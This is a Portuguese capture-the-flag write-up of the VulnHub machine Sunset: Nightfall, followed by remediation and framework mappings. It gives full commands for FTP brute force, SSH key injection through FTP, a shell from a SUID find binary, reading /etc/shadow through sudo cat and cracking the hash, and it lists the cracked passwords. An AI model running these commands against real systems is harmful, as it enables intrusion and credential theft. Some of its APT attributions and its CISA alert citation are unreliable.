# Sunset: Nightfall — Quando a Luz Some, as Credenciais Aparecem

Olha pessoal, Sunset: Nightfall é o tipo de máquina que ensina enumeração sistemática em múltiplos serviços na ordem certa. Brute-force FTP rende credenciais, acesso de escrita FTP permite injeção de chave SSH, um binário find com SUID permite movimentação lateral, sudo cat no /etc/shadow permite quebra offline, e su para root fecha o loop. Sem exploits exóticos. Sem CVEs. Apenas enumeração metódica e exploração de más práticas. É impressionante o quanto você consegue chegar com apenas o básico feito corretamente. Parabéns ao whitecr0wz por manter a série Sunset consistente.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Sunset: Nightfall |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/sunset-nightfall,355/ |
| **Técnicas** | Descoberta de host, scan completo de portas, enumeração de usuários SMB (enum4linux), brute-force FTP (Hydra), injeção de chave SSH via acesso de escrita FTP, movimentação lateral via binário find SUID, escalonamento de privilégios via sudo cat + quebra offline /etc/shadow |
| **CVEs** | Sem CVE específico: explora configurações incorretas (CWE-287 — Autenticação Inadequada; CWE-269 — Gerenciamento de Privilégios Inadequado; CWE-521 — Requisitos de Senha Fracos) |
| **Grupos APT** | APT28 (Fancy Bear): injeção de chave SSH documentada como técnica de acesso inicial em múltiplas campanhas; OceanLotus (APT32): usa configuração incorreta de sudo e enumeração de binário SUID como procedimento operacional padrão de escalonamento de privilégios pós-foothold |

---

## Resumo do Ataque

```
nmap → FTP (21), SMB (139/445), SSH (22)
  |
  +-> enum4linux → usuários: nightfall, matt
  |
  +-> hydra -l matt -P rockyou.txt ftp → matt:Cheese
  |
  +-> login FTP como matt
  |       |
  |       +-> mkdir .ssh; put authorized_keys
  |
  +-> ssh -i /tmp/nightfall_key matt@ALVO
  |
  v
shell matt
  |
  +-> find / -perm -u=s → /script/find (dono: nightfall)
  |
  +-> /script/find . -exec /bin/sh -p \; -quit → shell nightfall
  |
  +-> (injetar chave no .ssh nightfall via FTP → SSH estável como nightfall)
  |
  v
shell nightfall
  |
  +-> sudo -l → (root) NOPASSWD: /bin/cat
  |
  +-> sudo cat /etc/shadow → hash root
  |
  +-> john root.hash → root:miguel2
  |
  +-> su - (senha: miguel2)
  |
  v
uid=0(root) → /root/flag.txt
```

---

## Metodologia

1. Descoberta de host e scan completo de portas
2. Enumeração SMB: enumerar nomes de usuários via RID cycling
3. Brute-force FTP: atacar nomes de usuários descobertos
4. Injeção de chave SSH: aproveitar acesso de escrita FTP para injetar authorized_keys
5. Acesso inicial como matt via chave SSH
6. Enumeração SUID: encontrar /script/find de propriedade de nightfall
7. Movimentação lateral: usar find SUID para spawnar shell como nightfall
8. Re-injetar chave SSH no diretório home de nightfall para acesso estável
9. Escalonamento de privilégios: sudo cat /etc/shadow + quebra offline
10. Root via su com senha quebrada

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.0.0/24
# Alvo: 192.168.0.24

nmap -A -p- 192.168.0.24
```

Portas abertas:

| Porta | Serviço | Versão |
|---|---|---|
| 21 | FTP | pyftpdlib |
| 139 | NetBIOS-SSN | Samba |
| 445 | SMB | Samba |
| 22 | SSH | OpenSSH (se presente) |

HTTP retorna conteúdo mínimo. Foco em FTP e SMB.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração de Usuários SMB

```bash
enum4linux -a 192.168.0.24
```

Usuários descobertos via RID cycling: `nightfall`, `matt`

```bash
# Verificar com nmblookup
nmblookup -A 192.168.0.24
```

Esses dois nomes de usuários são os alvos principais do ataque. Salve para brute-force FTP.

**Nota real:** RID cycling SMB revela contas de usuários locais sem exigir qualquer autenticação. Essa informação é frequentemente usada por APT28 e outros atores de ameaça para construir ataques de credencial direcionados. Desabilitar a enumeração SMB anônima é uma recomendação consistente nos benchmarks CIS e DISA STIGs.

**MITRE ATT&CK:** T1087.001 — Descoberta de Contas: Conta Local; T1135 — Descoberta de Compartilhamento de Rede

---

## Passo 3 — Brute-Force FTP

```bash
hydra -l matt \
  -P /usr/share/wordlists/rockyou.txt \
  192.168.0.24 ftp \
  -e nsr
```

Credenciais encontradas: `matt : Cheese`

```bash
# Verificar acesso FTP
ftp 192.168.0.24
# Usuário: matt
# Senha: Cheese
ftp> ls -la
ftp> pwd
```

Confirme que o diretório home FTP mapeia para o diretório home do usuário (permite injeção .ssh).

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 4 — Injeção de Chave SSH via FTP

Gere um par de chaves SSH:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/nightfall_key -N ""
cp /tmp/nightfall_key.pub /tmp/authorized_keys
```

Injete a chave pública via acesso de escrita FTP no diretório home de matt:

```bash
ftp 192.168.0.24
# Login: matt / Cheese
ftp> mkdir .ssh
ftp> cd .ssh
ftp> put /tmp/authorized_keys
ftp> ls
ftp> bye
```

Conecte via SSH usando a chave injetada:

```bash
ssh -i /tmp/nightfall_key matt@192.168.0.24
```

Shell inicial como `matt`.

**Nota real:** Acesso de escrita FTP ao diretório home de um usuário permite injeção de chave SSH mesmo sem conhecer nenhuma credencial SSH. Essa técnica é usada pelo APT28 como método padrão de acesso inicial: ganhar acesso de escrita ao diretório home por qualquer meio, injetar um arquivo authorized_keys, autenticar via chave SSH. A correção é em dois passos: restringir chroot FTP para que os usuários não possam acessar o diretório .ssh, ou desabilitar FTP completamente.

**MITRE ATT&CK:** T1098.004 — Manipulação de Conta: Chaves Autorizadas SSH; T1021.004 — Serviços Remotos: SSH

---

## Passo 5 — Enumeração SUID e Movimentação Lateral

Procure binários SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Descoberta: `/script/find` tem o bit SUID definido e é de propriedade do usuário `nightfall`.

Use o binário find SUID para spawnar um shell como nightfall:

```bash
cd /script
./find . -exec /bin/sh -p \; -quit
```

O shell agora está sendo executado como `nightfall`. Leia a flag de usuário:

```bash
cat /home/nightfall/user.txt
```

Para uma sessão SSH estável como nightfall, repita a injeção de chave:

```bash
ftp 192.168.0.24
# Login: matt / Cheese
ftp> cd /home/nightfall
ftp> mkdir .ssh
ftp> cd .ssh
ftp> put /tmp/authorized_keys
ftp> bye

ssh -i /tmp/nightfall_key nightfall@192.168.0.24
```

**Nota real:** Binários SUID em caminhos não padrão (como `/script/find`) são um vetor de escalonamento consistente. GTFOBins documenta dezenas de técnicas de exploração de binário SUID. A flag `-exec /bin/sh -p` no find spawna um shell preservando os privilégios elevados concedidos pelo bit SUID.

**MITRE ATT&CK:** T1548.001 — Mecanismo de Controle de Elevação de Abuso: Setuid e Setgid

---

## Passo 6 — Escalonamento de Privilégios via sudo + Quebra Shadow

Verifique privilégios sudo para nightfall:

```bash
sudo -l
```

Saída: `(root) NOPASSWD: /bin/cat`

O usuário nightfall pode executar `/bin/cat` como root sem senha. Isso diretamente permite leitura de qualquer arquivo no sistema:

```bash
sudo -u root cat /etc/shadow
```

Copie o hash root:

```bash
echo 'root:$6$<HASH>:...' > /tmp/root.hash
```

Quebre com John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/root.hash
john --show /tmp/root.hash
# root:miguel2
```

**Alternativa com hashcat (GPU):**

```bash
hashcat -m 1800 -d 1 -w 3 /tmp/root.hash /usr/share/wordlists/rockyou.txt
```

**MITRE ATT&CK:** T1548.003 — Mecanismo de Controle de Elevação de Abuso: Sudo; T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 7 — Shell Root e Flag

```bash
su -
# Senha: miguel2

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Nightfall conquistado, mano!

**Nota real:** `sudo cat` no /etc/shadow é uma configuração incorreta enganosamente simples, mas completamente crítica. A regra sudo parece inofensiva em isolamento, mas combinada com quebra offline fornece acesso root completo. OceanLotus (APT32) especificamente procura regras sudo concedendo acesso de leitura a arquivos do sistema como parte de sua lista de verificação padrão pós-foothold.

**MITRE ATT&CK:** T1552.003 — Credenciais Não Seguras: Histórico Bash (análogo ao acesso shadow)

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado Para |
|---|---|---|---|
| Usuários SMB | nightfall, matt | RID cycling enum4linux | Direcionamento brute-force FTP |
| Credencial FTP | matt:Cheese | Brute-force Hydra | Acesso FTP, injeção .ssh |
| Chave SSH | /tmp/nightfall_key | Gerada localmente | Acesso SSH como matt e nightfall |
| Flag de usuário | user.txt | /home/nightfall/ | Flag de usuário |
| Hash root | $6$... | /etc/shadow via sudo cat | Quebra offline |
| Senha root | miguel2 | John the Ripper | su para root |
| Flag root | /root/flag.txt | Pós-exploração | Máquina concluída |

---

## Lições Aprendidas

| # | Descoberta | Relevância Real | Lição Principal |
|---|---|---|---|
| 1 | Brute-force FTP com nomes de usuários obtidos via RID cycling | Enumeração de nomes de usuários permite ataques de credencial direcionados; rockyou cobre padrões comuns | Desabilitar enumeração anônima de usuários SMB; aplicar políticas de bloqueio de conta FTP |
| 2 | Acesso de escrita FTP ao diretório home permite injeção de chave SSH | Acesso de escrita a ~/.ssh/ é equivalente a acesso SSH sem senha | Restringir chroot FTP; definir `AllowUsers` no sshd_config; monitorar mudanças no diretório .ssh/ |
| 3 | find SUID no caminho não padrão com propriedade incorreta | Qualquer binário SUID de propriedade de um usuário executa como esse usuário, sem credenciais | Auditar todos os binários SUID; restringir SUID a binários de sistema confiáveis apenas |
| 4 | sudo cat /etc/shadow permite quebra offline de senha root | Qualquer regra sudo concedendo acesso de leitura a arquivos sensíveis é um caminho para escalonamento | Auditar todas as regras sudo; nunca conceder acesso cat/read ao /etc/shadow |
| 5 | Senha root fraca quebrada pelo rockyou (miguel2) | Quebra de senha root a partir do shadow é um risco conhecido; senhas comuns caem imediatamente | Aplicar senhas root fortes; considerar desabilitar login root direto completamente |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Contas: Conta Local | T1087.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha (FTP) | T1110.001 |
| Persistência | Persistência | Manipulação de Conta: Chaves Autorizadas SSH | T1098.004 |
| Acesso Inicial | Acesso Inicial | Serviços Remotos: SSH | T1021.004 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Mecanismo de Controle de Elevação de Abuso: Setuid e Setgid | T1548.001 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Mecanismo de Controle de Elevação de Abuso: Sudo | T1548.003 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilitar FTP ou aplicar chroot:** `chroot_local_user=YES` no vsftpd.conf; usuários não devem poder acessar o diretório .ssh/ via FTP
2. **Restringir SUID /script/find:** `chmod u-s /script/find`; binários SUID não padrão nunca devem ser de propriedade de usuários não-root
3. **Remover regra sudo cat /etc/shadow:** editar /etc/sudoers; sem acesso de leitura ao /etc/shadow via sudo
4. **Aplicar senha root forte:** mínimo 12 caracteres, letras maiúsculas e minúsculas, números, símbolos; considerar root sem senha com SSH apenas por chave
5. **Desabilitar RID cycling SMB anônimo:** configurar Samba para restringir enumeração de usuários
6. **Monitorar modificações em .ssh/authorized_keys:** implementar monitoramento de integridade de arquivo em todos os diretórios .ssh/

### D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (chroot FTP; restrição sudoers)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (auditoria SUID; auditoria de regra sudo)
- **D3-FIM** — Monitoramento de Integridade de Arquivo (mudanças em .ssh/authorized_keys)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os serviços FTP e suas permissões de escrita |
| Proteger | Controle de Acesso | Aplicar chroot FTP; restringir regras sudo; remover SUID de binários não padrão |
| Proteger | Segurança de Dados | Sem acesso sudo ao /etc/shadow; aplicar senha root forte |
| Detectar | Anomalias e Eventos | Monitorar modificações em authorized_keys; alertar sobre sudo cat /etc/shadow |
| Responder | Planejamento de Resposta | Revogar chaves SSH injetadas; remover regras sudo maliciosas; rotacionar todas as credenciais |
| Recuperar | Planejamento de Recuperação | Auditar todas as configurações FTP, SSH e sudo; implementar FIM |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Chroot FTP; restrição de acesso sudo |
| AC-6 | Menor Privilégio | Remover SUID de binários não essenciais; sem sudo cat /etc/shadow |
| IA-5 | Gerenciamento de Autenticadores | Senha root forte; SSH apenas por chave |
| CM-7 | Menor Funcionalidade | Desabilitar FTP ou aplicar chroot; desabilitar enumeração anônima SMB |
| SI-7 | Integridade de Software | Monitorar .ssh/authorized_keys para modificações não autorizadas |
| AU-6 | Revisão de Auditoria | Revisar logs de auditoria de comando sudo |

### CISA KEV

Nenhum CVE específico se aplica. A cadeia de ataque dessa máquina mapeia ao Alerta CISA AA21-048A (ataques de credencial FTP e SSH) e às orientações de hardening CISA para sistemas Linux, que especificamente mencionam: desabilitar FTP anônimo, auditar binários SUID e restringir sudo a operações mínimas necessárias. A CISA também referencia políticas de credencial fraca (senhas da classe root:miguel2) como uma fraqueza consistentemente explorada em seus relatórios anuais de resumo de vulnerabilidades.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos TI e OT | MIL2 |

---

## Considerações Finais

Sunset: Nightfall é uma máquina de fundamentos e é exatamente isso que a torna valiosa. Cada passo explora uma configuração incorreta real: acesso de escrita FTP, enumeração de usuários SMB, SUID em binário com propriedade incorreta, sudo com acesso de leitura ao shadow, senha root fraca. Nada disso é exótico. Tudo é evitável. A máquina ensina ordem de enumeração metódica, e essa lição se aplica a todo engajamento real. Máquina de ensino top demais, véi!

Thanks guys!! (❍ᴥ❍ʋ)
